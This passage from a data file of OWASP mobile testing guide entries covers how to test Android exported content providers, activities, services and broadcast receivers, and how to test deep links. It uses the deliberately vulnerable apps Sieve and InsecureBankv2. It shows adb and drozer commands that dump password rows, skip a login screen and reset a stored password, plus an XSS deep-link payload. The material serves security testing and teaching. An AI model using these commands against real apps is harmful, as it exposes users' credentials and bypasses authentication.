public static final Uri KEYS_URI = Uri.parse(\"content://com.mwr.example.sieve.DBContentProvider/Keys\");\n    public static final Uri PASSWORDS_URI = Uri.parse(\"content://com.mwr.example.sieve.DBContentProvider/Passwords\");\n...\n}\n</pre><p>Use the following commands to call the content provider using the identified URIs:</p><pre>$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Keys/\nRow: 0 Password=1234567890AZERTYUIOPazertyuiop, pin=1234\n\n$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/\nRow: 0 _id=1, service=test, username=test, password=BLOB, email=t@tedt.com\nRow: 1 _id=2, service=bank, username=owasp, password=BLOB, email=user@tedt.com\n\n$ adb shell content query --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection email:username:password --where 'service=\\\"bank\\\"'\nRow: 0 email=user@tedt.com, username=owasp, password=BLOB\n</pre><p>You are able now to retrieve all database entries (see all lines starting with \"Row:\" in the output).</p><h3>Activities</h3><p>To list activities exported by an application, you can use the following command and focus on activity elements:</p><pre>$ aapt d xmltree sieve.apk AndroidManifest.xml\n...\nE: activity (line=32)\n  A: android:label(0x01010001)=@0x7f05000f\n  A: android:name(0x01010003)=\".FileSelectActivity\" (Raw: \".FileSelectActivity\")\n  A: android:exported(0x01010010)=(type 0x12)0xffffffff\n  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff\n  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\nE: activity (line=40)\n  A: android:label(0x01010001)=@0x7f050000\n  A: android:name(0x01010003)=\".MainLoginActivity\" (Raw: \".MainLoginActivity\")\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\n  A: android:launchMode(0x0101001d)=(type 0x10)0x2\n  A: android:windowSoftInputMode(0x0101022b)=(type 0x11)0x14\n  E: intent-filter (line=46)\n    E: action (line=47)\n      A: android:name(0x01010003)=\"android.intent.action.MAIN\" (Raw: \"android.intent.action.MAIN\")\n    E: category (line=49)\n      A: android:name(0x01010003)=\"android.intent.category.LAUNCHER\" (Raw: \"android.intent.category.LAUNCHER\")\nE: activity (line=52)\n  A: android:label(0x01010001)=@0x7f050009\n  A: android:name(0x01010003)=\".PWList\" (Raw: \".PWList\")\n  A: android:exported(0x01010010)=(type 0x12)0xffffffff\n  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff\n  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\nE: activity (line=60)\n  A: android:label(0x01010001)=@0x7f05000a\n  A: android:name(0x01010003)=\".SettingsActivity\" (Raw: \".SettingsActivity\")\n  A: android:finishOnTaskLaunch(0x01010014)=(type 0x12)0xffffffff\n  A: android:clearTaskOnLaunch(0x01010015)=(type 0x12)0xffffffff\n  A: android:excludeFromRecents(0x01010017)=(type 0x12)0xffffffff\n...\n</pre><p>You can identify an exported activity using one of the following properties:</p><ul><li>It have an intent-filter sub declaration.</li><li>It have the attribute android:exported to 0xffffffff.</li></ul><p>You can also use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0018\" rel=\"noopener noreferrer\" target=\"_blank\"> jadx</a></em> to identify exported activities in the file AndroidManifest.xml using the criteria described above:</p><pre>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.mwr.example.sieve\"&gt;\n...\n  &lt;!-- This activity is exported via the attribute \"exported\" --&gt;\n  &lt;activity android:name=\".FileSelectActivity\" android:exported=\"true\" /&gt;\n   &lt;!-- This activity is exported via the \"intent-filter\" declaration  --&gt;\n  &lt;activity android:name=\".MainLoginActivity\"&gt;\n    &lt;intent-filter&gt;\n      &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n      &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n    &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n  &lt;!-- This activity is exported via the attribute \"exported\" --&gt;\n  &lt;activity android:name=\".PWList\" android:exported=\"true\" /&gt;\n  &lt;!-- Activities below are not exported --&gt;\n  &lt;activity android:name=\".SettingsActivity\" /&gt;\n  &lt;activity android:name=\".AddEntryActivity\"/&gt;\n  &lt;activity android:name=\".ShortLoginActivity\" /&gt;\n  &lt;activity android:name=\".WelcomeActivity\" /&gt;\n  &lt;activity android:name=\".PINActivity\" /&gt;\n...\n&lt;/manifest&gt;\n</pre><p>Enumerating activities in the vulnerable password manager \"Sieve\" shows that the following activities are exported:</p><ul><li>.MainLoginActivity</li><li>.PWList</li><li>.FileSelectActivity</li></ul><p>Use the command below to launch an activity:</p><pre># Start the activity without specifying an action or an category\n$ adb shell am start -n com.mwr.example.sieve/.PWList\nStarting: Intent { cmp=com.mwr.example.sieve/.PWList }\n\n# Start the activity indicating an action (-a) and an category (-c)\n$ adb shell am start -n \"com.mwr.example.sieve/.MainLoginActivity\" -a android.intent.action.MAIN -c android.intent.category.LAUNCHER\nStarting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=com.mwr.example.sieve/.MainLoginActivity }\n</pre><p>Since the activity .PWList is called directly in this example, you can use it to bypass the login form protecting the password manager, and access the data contained within the password manager.</p><h3>Services</h3><p>Services can be enumerated with the Drozer module app.service.info:</p><pre>dz&gt; run app.service.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\n  com.mwr.example.sieve.AuthService\n    Permission: null\n  com.mwr.example.sieve.CryptoService\n    Permission: null\n</pre><p>To communicate with a service, you must first use static analysis to identify the required inputs.</p><p>Because this service is exported, you can use the module app.service.send to communicate with the service and change the password stored in the target application:</p><pre>dz&gt; run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD \"abcdabcdabcdabcd\" --bundle-as-obj\nGot a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:\n  what: 4\n  arg1: 42\n  arg2: 0\n  Empty\n</pre><h3>Broadcast Receivers</h3><p>To list broadcast receivers exported by an application, you can use the following command and focus on receiver elements:</p><pre>$ aapt d xmltree InsecureBankv2.apk AndroidManifest.xml\n...\nE: receiver (line=88)\n  A: android:name(0x01010003)=\"com.android.insecurebankv2.MyBroadCastReceiver\" (Raw: \"com.android.insecurebankv2.MyBroadCastReceiver\")\n  A: android:exported(0x01010010)=(type 0x12)0xffffffff\n  E: intent-filter (line=91)\n    E: action (line=92)\n      A: android:name(0x01010003)=\"theBroadcast\" (Raw: \"theBroadcast\")\nE: receiver (line=119)\n  A: android:name(0x01010003)=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" (Raw: \"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\")\n  A: android:exported(0x01010010)=(type 0x12)0x0\n  E: intent-filter (line=122)\n    E: action (line=123)\n      A: android:name(0x01010003)=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\" (Raw: \"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\")\n...\n</pre><p>You can identify an exported broadcast receiver using one of the following properties:</p><ul><li>It has an intent-filter sub declaration.</li><li>It has the attribute android:exported set to 0xffffffff.</li></ul><p>You can also use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0018\" rel=\"noopener noreferrer\" target=\"_blank\"> jadx</a></em> to identify exported broadcast receivers in the file AndroidManifest.xml using the criteria described above:</p><pre>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.android.insecurebankv2\"&gt;\n...\n  &lt;!-- This broadcast receiver is exported via the attribute \"exported\" as well as the \"intent-filter\" declaration --&gt;\n  &lt;receiver android:name=\"com.android.insecurebankv2.MyBroadCastReceiver\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n      &lt;action android:name=\"theBroadcast\"/&gt;\n    &lt;/intent-filter&gt;\n  &lt;/receiver&gt;\n  &lt;!-- This broadcast receiver is NOT exported because the attribute \"exported\" is explicitly set to false --&gt;\n  &lt;receiver android:name=\"com.google.android.gms.wallet.EnableWalletOptimizationReceiver\" android:exported=\"false\"&gt;\n    &lt;intent-filter&gt;\n      &lt;action android:name=\"com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION\"/&gt;\n    &lt;/intent-filter&gt;\n  &lt;/receiver&gt;\n...\n&lt;/manifest&gt;\n</pre><p>The above example from the vulnerable banking application <em><a href=\"https://mas.owasp.org/MASTG-APP-0010\" rel=\"noopener noreferrer\" target=\"_blank\"> InsecureBankv2</a></em> shows that only the broadcast receiver named com.android.insecurebankv2.MyBroadCastReceiver is exported.</p><p>Now that you know that there is an exported broadcast receiver, you can dive deeper and reverse engineer the app using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0018\" rel=\"noopener noreferrer\" target=\"_blank\"> jadx</a></em>. This will allow you to analyze the source code searching for potential vulnerabilities that you could later try to exploit. The source code of the exported broadcast receiver is the following:</p><pre>package com.android.insecurebankv2;\n...\npublic class MyBroadCastReceiver extends BroadcastReceiver {\n    public static final String MYPREFS = \"mySharedPreferences\";\n    String usernameBase64ByteString;\n\n    public void onReceive(Context context, Intent intent) {\n        String phn = intent.getStringExtra(\"phonenumber\");\n        String newpass = intent.getStringExtra(\"newpass\");\n        if (phn != null) {\n            try {\n                SharedPreferences settings = context.getSharedPreferences(\"mySharedPreferences\", 1);\n                this.usernameBase64ByteString = new String(Base64.decode(settings.getString(\"EncryptedUsername\", (String) null), 0), \"UTF-8\");\n                String decryptedPassword = new CryptoClass().aesDeccryptedString(settings.getString(\"superSecurePassword\", (String) null));\n                String textPhoneno = phn.toString();\n                String textMessage = \"Updated Password from: \" + decryptedPassword + \" to: \" + newpass;\n                SmsManager smsManager = SmsManager.getDefault();\n                System.out.println(\"For the changepassword - phonenumber: \" + textPhoneno + \" password is: \" + textMessage);\n                smsManager.sendTextMessage(textPhoneno, (String) null, textMessage, (PendingIntent) null, (PendingIntent) null);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"Phone number is null\");\n        }\n    }\n}\n</pre><p>As you can see in the source code, this broadcast receiver expects two parameters named phonenumber and newpass. With this information you can now try to exploit this broadcast receiver by sending events to it using custom values:</p><pre># Send an event with the following properties:\n# Action is set to \"theBroadcast\"\n# Parameter \"phonenumber\" is set to the string \"07123456789\"\n# Parameter \"newpass\" is set to the string \"12345\"\n$ adb shell am broadcast -a theBroadcast --es phonenumber \"07123456789\" --es newpass \"12345\"\nBroadcasting: Intent { act=theBroadcast flg=0x400000 (has extras) }\nBroadcast completed: result=0\n</pre><p>This generates the following SMS:</p><pre>Updated Password from: SecretPassword@ to: 12345\n</pre><p>Sniffing Intents</p><p>If an Android application broadcasts intents without setting a required permission or specifying the destination package, the intents can be monitored by any application that runs on the device.</p><p>To register a broadcast receiver to sniff intents, use the Drozer module app.broadcast.sniff and specify the action to monitor with the --action parameter:</p><pre>dz&gt; run app.broadcast.sniff  --action theBroadcast\n[*] Broadcast receiver registered to sniff matching intents\n[*] Output is updated once a second. Press Control+C to exit.\n\nAction: theBroadcast\nRaw: Intent { act=theBroadcast flg=0x10 (has extras) }\nExtra: phonenumber=07123456789 (java.lang.String)\nExtra: newpass=12345 (java.lang.String)`\n</pre><p>You can also use the following command to sniff the intents. However, the content of the extras passed will not be displayed:</p><pre>$ adb shell dumpsys activity broadcasts | grep \"theBroadcast\"\nBroadcastRecord{fc2f46f u0 theBroadcast} to user 0\nIntent { act=theBroadcast flg=0x400010 (has extras) }\nBroadcastRecord{7d4f24d u0 theBroadcast} to user 0\nIntent { act=theBroadcast flg=0x400010 (has extras) }\n45: act=theBroadcast flg=0x400010 (has extras)\n46: act=theBroadcast flg=0x400010 (has extras)\n121: act=theBroadcast flg=0x400010 (has extras)\n144: act=theBroadcast flg=0x400010 (has extras)\n</pre>",
        "code": "MASTG-TEST-0029",
        "sort_order": 63
    },
    {
        "tags":
        [
            "MASTG-TEST-0028: Testing Deep Links"
        ],
        "testcase": "Testing Deep Links",
        "details": "<h2>Overview</h2><p>Any existing <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#deep-links\" rel=\"noopener noreferrer\" target=\"_blank\">deep links</a> (including App Links) can potentially increase the app attack surface. This <a href=\"https://people.cs.vt.edu/gangwang/deep17.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">includes many risks ↗</a> such as link hijacking, sensitive functionality exposure, etc.</p><ul><li>Before Android 12 (API level 31), if the app has any <a href=\"https://developer.android.com/training/app-links/verify-android-applinks#fix-errors\" rel=\"noopener noreferrer\" target=\"_blank\">non-verifiable links ↗</a>, it can cause the system to not verify all Android App Links for that app.</li><li>Starting on Android 12 (API level 31), apps benefit from a <a href=\"https://developer.android.com/training/app-links/deep-linking\" rel=\"noopener noreferrer\" target=\"_blank\">reduced attack surface ↗</a>. A generic web intent resolves to the user's default browser app unless the target app is approved for the specific domain contained in that web intent.</li></ul><p>All deep links must be enumerated and verified for correct website association. The actions they perform must be well tested, especially all input data, which should be deemed untrustworthy and thus should always be validated.</p><p>None of the input from these sources can be trusted; it must be validated and/or sanitized. Validation ensures processing of data that the app is expecting only. If validation is not enforced, any input can be sent to the app, which may allow an attacker or malicious app to exploit app functionality.</p><h2></h2><h2>Static Analysis</h2><h3>Check for Android OS Version</h3><p>The Android version in which the app runs also influences the risk of using deep links. Inspect the Android Manifest to check if minSdkVersion is 31 or higher.</p><ul><li>Before Android 12 (API level 31), if the app has any <a href=\"https://developer.android.com/training/app-links/verify-android-applinks#fix-errors\" rel=\"noopener noreferrer\" target=\"_blank\">non-verifiable deep links ↗</a>, it can cause the system to not verify all Android App Links for that app.</li><li>Starting on Android 12 (API level 31), apps benefit from a <a href=\"https://developer.android.com/training/app-links/deep-linking\" rel=\"noopener noreferrer\" target=\"_blank\">reduced attack surface ↗</a>. A generic web intent resolves to the user's default browser app unless the target app is approved for the specific domain contained in that web intent.</li></ul><h3>Check for Deep Link Usage</h3><p><strong>Inspecting the Android Manifest:</strong></p><p>You can easily determine whether deep links (with or without custom URL schemes) are defined by <em><a href=\"https://mas.owasp.org/MASTG-TECH-0007\" rel=\"noopener noreferrer\" target=\"_blank\"> Exploring the App Package</a></em> and inspecting the Android Manifest file looking for <a href=\"https://developer.android.com/guide/components/intents-filters.html#DataTest\" rel=\"noopener noreferrer\" target=\"_blank\">&lt;intent-filter&gt; elements ↗</a>.</p><ul><li><strong>Custom Url Schemes</strong>: The following example specifies a deep link with a custom URL scheme called myapp://.</li></ul><pre>&lt;activity android:name=\".MyUriActivity\"&gt;\n  &lt;intent-filter&gt;\n      &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n      &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n      &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n      &lt;data android:scheme=\"myapp\" android:host=\"path\" /&gt;\n  &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</pre><ul><li><strong>Deep Links</strong>: The following example specifies a deep Link using both the http:// and https:// schemes, along with the host and path that will activate it (in this case, the full URL would be https://www.myapp.com/my/app/path):</li></ul><pre>&lt;intent-filter&gt;\n  ...\n  &lt;data android:scheme=\"http\" android:host=\"www.myapp.com\" android:path=\"/my/app/path\" /&gt;\n  &lt;data android:scheme=\"https\" android:host=\"www.myapp.com\" android:path=\"/my/app/path\" /&gt;\n&lt;/intent-filter&gt;\n</pre><ul><li><strong>App Links</strong>: If the &lt;intent-filter&gt; includes the flag android:autoVerify=\"true\", this causes the Android system to reach out to the declared android:host in an attempt to access the <a href=\"https://developers.google.com/digital-asset-links/v1/getting-started\" rel=\"noopener noreferrer\" target=\"_blank\">Digital Asset Links file ↗</a> in order to <a href=\"https://developer.android.com/training/app-links/verify-android-applinks\" rel=\"noopener noreferrer\" target=\"_blank\">verify the App Links ↗</a>. <strong>A deep link can be considered an App Link only if the verification is successful.</strong></li></ul><pre>&lt;intent-filter android:autoVerify=\"true\"&gt;\n</pre><p>When listing deep links remember that &lt;data&gt; elements within the same &lt;intent-filter&gt; are actually merged together to account for all variations of their combined attributes.</p><pre>&lt;intent-filter&gt;\n  ...\n  &lt;data android:scheme=\"https\" android:host=\"www.example.com\" /&gt;\n  &lt;data android:scheme=\"app\" android:host=\"open.my.app\" /&gt;\n&lt;/intent-filter&gt;\n</pre><p>It might seem as though this supports only https://www.example.com and app://open.my.app. However, it actually supports:</p><ul><li>https://www.example.com</li><li>app://open.my.app</li><li>app://www.example.com</li><li>https://open.my.app</li></ul><p><strong>Using Dumpsys:</strong></p><p>Use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> adb</a></em> to run the following command that will show all schemes:</p><pre>adb shell dumpsys package com.example.package\n</pre><p><strong>Using Android \"App Link Verification\" Tester:</strong></p><p>Use the <a href=\"https://github.com/inesmartins/Android-App-Link-Verification-Tester\" rel=\"noopener noreferrer\" target=\"_blank\">Android \"App Link Verification\" Tester ↗</a> script to list all deep links (list-all) or only app links (list-applinks):</p><pre>python3 deeplink_analyser.py -op list-all -apk ~/Downloads/example.apk\n.MainActivity\napp://open.my.app\napp://www.example.com\nhttps://open.my.app\nhttps://www.example.com\n</pre><h3>Check for Correct Website Association</h3><p>Even if deep links contain the android:autoVerify=\"true\" attribute, they must be <em>actually</em> verified in order to be considered App Links. You should test for any possible misconfigurations that might prevent full verification.</p><p>Automatic Verification</p><p>Use the <a href=\"https://github.com/inesmartins/Android-App-Link-Verification-Tester\" rel=\"noopener noreferrer\" target=\"_blank\">Android \"App Link Verification\" Tester ↗</a> script to get the verification status for all app links (verify-applinks). See an example <a href=\"https://github.com/inesmartins/Android-App-Link-Verification-Tester#use-an-apk-to-check-for-dals-for-all-app-links\" rel=\"noopener noreferrer\" target=\"_blank\">here ↗</a>.</p><p><strong>Only on Android 12 (API level 31) or higher:</strong></p><p>You can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> adb</a></em> to test the verification logic regardless of whether the app targets Android 12 (API level 31) or not. This feature allows you to:</p><ul><li><a href=\"https://developer.android.com/training/app-links/verify-android-applinks#support-updated-domain-verification\" rel=\"noopener noreferrer\" target=\"_blank\">invoke the verification process manually ↗</a>.</li><li><a href=\"https://developer.android.com/training/app-links/verify-android-applinks#reset-state\" rel=\"noopener noreferrer\" target=\"_blank\">reset the state of the target app's Android App Links on your device ↗</a>.</li><li><a href=\"https://developer.android.com/training/app-links/verify-android-applinks#invoke-domain-verification\" rel=\"noopener noreferrer\" target=\"_blank\">invoke the domain verification process ↗</a>.</li></ul><p>You can also <a href=\"https://developer.android.com/training/app-links/verify-android-applinks#review-results\" rel=\"noopener noreferrer\" target=\"_blank\">review the verification results ↗</a>. For example:</p><pre>adb shell pm get-app-links com.example.package\ncom.example.package:\n    ID: 01234567-89ab-cdef-0123-456789abcdef\n    Signatures: [***]\n    Domain verification state:\n      example.com: verified\n      sub.example.com: legacy_failure\n      example.net: verified\n      example.org: 1026\n</pre><p>The same information can be found by running adb shell dumpsys package com.example.package (only on Android 12 (API level 31) or higher).</p><p>Manual Verification</p><p>This section details a few, of potentially many, reasons why the verification process failed or was not actually triggered. See more information in the <a href=\"https://developer.android.com/training/app-links/verify-android-applinks#fix-errors\" rel=\"noopener noreferrer\" target=\"_blank\">Android Developers Documentation ↗</a> and in the white paper <a href=\"https://people.cs.vt.edu/gangwang/deep17.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">\"Measuring the Insecurity of Mobile Deep Links of Android\" ↗</a>.</p><p><strong>Check the <a href=\"https://developers.google.com/digital-asset-links/v1/getting-started\" rel=\"noopener noreferrer\" target=\"_blank\">Digital Asset Links file ↗</a>:</strong></p><ul><li>Check for <strong>missing</strong> Digital Asset Links file:<ul><li>try to find it in the domain's /.well-known/ path. Example: https://www.example.com/.well-known/assetlinks.json</li><li>or try https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=www.example.com</li></ul></li><li>Check for valid Digital Asset Links file <strong>served via HTTP</strong>.</li><li>Check for <strong>invalid</strong> Digital Asset Links files served via HTTPS. For example:<ul><li>the file contains invalid JSON.</li><li>the file doesn't include the target app's package.</li></ul></li></ul><p><strong>Check for Redirects:</strong></p><p>To enhance the app security, the system <a href=\"https://developer.android.com/training/app-links/verify-android-applinks#fix-errors\" rel=\"noopener noreferrer\" target=\"_blank\">doesn't verify any Android App Links ↗</a> for an app if the server sets a redirect such as http://example.com to https://example.com or example.com to www.example.com.</p><p><strong>Check for Subdomains:</strong></p><p>If an intent filter lists multiple hosts with different subdomains, there must be a valid Digital Asset Links file on each domain. For example, the following intent filter includes www.example.com and mobile.example.com as accepted intent URL hosts.</p><pre>&lt;application&gt;\n  &lt;activity android:name=”MainActivity”&gt;\n    &lt;intent-filter android:autoVerify=\"true\"&gt;\n      &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n      &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n      &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n      &lt;data android:scheme=\"https\" /&gt;\n      &lt;data android:scheme=\"https\" /&gt;\n      &lt;data android:host=\"www.example.com\" /&gt;\n      &lt;data android:host=\"mobile.example.com\" /&gt;\n    &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n&lt;/application&gt;\n</pre><p>In order for the deep links to correctly register, a valid Digital Asset Links file must be published at both https://www.example.com/.well-known/assetlinks.json and https://mobile.example.com/.well-known/assetlinks.json.</p><p><strong>Check for Wildcards:</strong></p><p>If the hostname includes a wildcard (such as *.example.com), you should be able to find a valid Digital Asset Links file at the root hostname: https://example.com/.well-known/assetlinks.json.</p><h3>Check the Handler Method</h3><p>Even if the deep link is correctly verified, the logic of the handler method should be carefully analyzed. Pay special attention to <strong>deep links being used to transmit data</strong> (which is controlled externally by the user or any other app).</p><p>First, obtain the name of the Activity from the Android Manifest &lt;activity&gt; element which defines the target &lt;intent-filter&gt; and search for usage of <a href=\"https://developer.android.com/reference/android/content/Intent#getIntent(java.lang.String)\" rel=\"noopener noreferrer\" target=\"_blank\">getIntent ↗</a> and <a href=\"https://developer.android.com/reference/android/content/Intent#getData%28%29\" rel=\"noopener noreferrer\" target=\"_blank\">getData ↗</a>. This general approach of locating these methods can be used across most applications when performing reverse engineering and is key when trying to understand how the application uses deep links and handles any externally provided input data and if it could be subject to any kind of abuse.</p><p>The following example is a snippet from an example Kotlin app decompiled with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0018\" rel=\"noopener noreferrer\" target=\"_blank\"> jadx</a></em>. From the <a href=\"https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#check-for-deep-link-usage\" rel=\"noopener noreferrer\" target=\"_blank\">static analysis</a> we know that it supports the deep link deeplinkdemo://load.html/ as part of com.mstg.deeplinkdemo.WebViewActivity.</p><pre>// snippet edited for simplicity\npublic final class WebViewActivity extends AppCompatActivity {\n    private ActivityWebViewBinding binding;\n\n    public void onCreate(Bundle savedInstanceState) {\n        Uri data = getIntent().getData();\n        String html = data == null ? null : data.getQueryParameter(\"html\");\n        Uri data2 = getIntent().getData();\n        String deeplink_url = data2 == null ? null : data2.getQueryParameter(\"url\");\n        View findViewById = findViewById(R.id.webView);\n        if (findViewById != null) {\n            WebView wv = (WebView) findViewById;\n            wv.getSettings().setJavaScriptEnabled(true);\n            if (deeplink_url != null) {\n                wv.loadUrl(deeplink_url);\n            ...\n</pre><p>You can simply follow the deeplink_url String variable and see the result from the wv.loadUrl call. This means the attacker has full control of the URL being loaded to the WebView (as shown above has <em><a href=\"https://mas.owasp.org/MASTG-TEST-0031\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing JavaScript Execution in WebViews</a></em>.</p><p>The same WebView might be also rendering an attacker controlled parameter. In that case, the following deep link payload would trigger <a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#cross-site-scripting-flaws\" rel=\"noopener noreferrer\" target=\"_blank\">Reflected Cross-Site Scripting (XSS)</a> within the context of the WebView:</p><pre>deeplinkdemo://load.html?attacker_controlled=&lt;svg onload=alert(1)&gt;\n</pre><p>But there are many other possibilities. Be sure to check the following sections to learn more about what to expect and how to test different scenarios:</p><ul><li><a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#cross-site-scripting-flaws\" rel=\"noopener noreferrer\" target=\"_blank\">\"Cross-Site Scripting Flaws\"</a>.</li><li><a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#injection-flaws\" rel=\"noopener noreferrer\" target=\"_blank\">\"Injection Flaws\"</a>.</li><li><em><a href=\"https://mas.owasp.org/MASTG-TEST-0034\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Object Persistence</a></em>.</li><li><em><a href=\"https://mas.owasp.org/MASTG-TEST-0027\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing for URL Loading in WebViews</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-TEST-0031\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing JavaScript Execution in WebViews</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-TEST-0032\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing WebView Protocol Handlers</a></em></li></ul><p>In addition, we recommend to search and read public reports (search term: \"deep link*\"|\"deeplink*\" site:https://hackerone.com/reports/). For example:</p><ul><li><a href=\"https://hackerone.com/reports/1372667\" rel=\"noopener noreferrer\" target=\"_blank\">\"[HackerOne#1372667] Able to steal bearer token from deep link\" ↗</a></li><li><a href=\"https://hackerone.com/reports/401793\" rel=\"noopener noreferrer\" target=\"_blank\">\"[HackerOne#401793] Insecure deeplink leads to sensitive information disclosure\" ↗</a></li><li><a href=\"https://hackerone.com/reports/583987\" rel=\"noopener noreferrer\" target=\"_blank\">\"[HackerOne#583987] Android app deeplink leads to CSRF in follow action\" ↗</a></li><li><a href=\"https://hackerone.com/reports/637194\" rel=\"noopener noreferrer\" target=\"_blank\">\"[HackerOne#637194] Bypass of biometrics security functionality is possible in Android application\" ↗</a></li><li><a href=\"https://hackerone.com/reports/341908\" rel=\"noopener noreferrer\" target=\"_blank\">\"[HackerOne#341908] XSS via Direct Message deeplinks\" ↗</a></li></ul><h2></h2><h2>Dynamic Analysis</h2><p>Here you will use the list of deep links from the static analysis to iterate and determine each handler method and the processed data, if any. You will first start a <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0031\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida</a></em> hook and then begin invoking the deep links.</p><p>The following example assumes a target app that accepts this deep link: deeplinkdemo://load.html. However, we don't know the corresponding handler method yet, nor the parameters it potentially accepts.</p><p><strong>[Step 1] Frida Hooking:</strong></p><p>You can use the script <a href=\"https://codeshare.frida.re/@leolashkevych/android-deep-link-observer/\" rel=\"noopener noreferrer\" target=\"_blank\">\"Android Deep Link Observer\" ↗</a> from <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0032\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida CodeShare</a></em> to monitor all invoked deep links triggering a call to Intent.getData. You can also use the script as a base to include your own modifications depending on the use case at hand. In this case we <a href=\"https://github.com/FrenchYeti/frida-trick/blob/master/README.md\" rel=\"noopener noreferrer\" target=\"_blank\">included the stack trace ↗</a> in the script since we are interested in the method which calls Intent.getData.</p><p><strong>[Step 2] Invoking Deep Links:</strong></p><p>Now you can invoke any of the deep links using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> adb</a></em> and the <a href=\"https://developer.android.com/training/app-links/deep-linking#testing-filters\" rel=\"noopener noreferrer\" target=\"_blank\">Activity Manager (am) ↗</a> which will send intents within the Android device. For example:</p><pre>adb shell am start -W -a android.intent.action.VIEW -d \"deeplinkdemo://load.html/?message=ok#part1\"\n\nStarting: Intent { act=android.intent.action.VIEW dat=deeplinkdemo://load.html/?message=ok }\nStatus: ok\nLaunchState: WARM\nActivity: com.mstg.deeplinkdemo/.WebViewActivity\nTotalTime: 210\nWaitTime: 217\nComplete\n</pre><p>This might trigger the disambiguation dialog when using the \"http/https\" schema or if other installed apps support the same custom URL schema. You can include the package name to make it an explicit intent.</p><p>This invocation will log the following:</p><pre>[*] Intent.getData() was called\n[*] Activity: com.mstg.deeplinkdemo.WebViewActivity\n[*] Action: android.intent.action.VIEW\n\n[*] Data\n- Scheme: deeplinkdemo://\n- Host: /load.html\n- Params: message=ok\n- Fragment: part1\n\n[*] Stacktrace:\n\nandroid.content.Intent.getData(Intent.java)\ncom.mstg.deeplinkdemo.WebViewActivity.onCreate(WebViewActivity.kt)\nandroid.app.Activity.performCreate(Activity.java)\n...\ncom.android.internal.os.ZygoteInit.main(ZygoteInit.java)\n</pre><p>In this case we've crafted the deep link including arbitrary parameters (?message=ok) and fragment (#part1). We still don't know if they are being used. The information above reveals useful information that you can use now to reverse engineer the app. See the section <a href=\"https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/#check-the-handler-method\" rel=\"noopener noreferrer\" target=\"_blank\">\"Check the Handler Method\"</a> to learn about things you should consider.</p><ul><li>File: WebViewActivity.kt</li><li>Class: com.mstg.deeplinkdemo.WebViewActivity</li><li>Method: onCreate</li></ul><p>Sometimes you can even take advantage of other applications that you know interact with your target app. You can reverse engineer the app, (e.g. to extract all strings and filter those which include the target deep links, deeplinkdemo:///load.html in the previous case), or use them as triggers, while hooking the app as previously discussed.</p>",
        "code": "MASTG-TEST-0028",
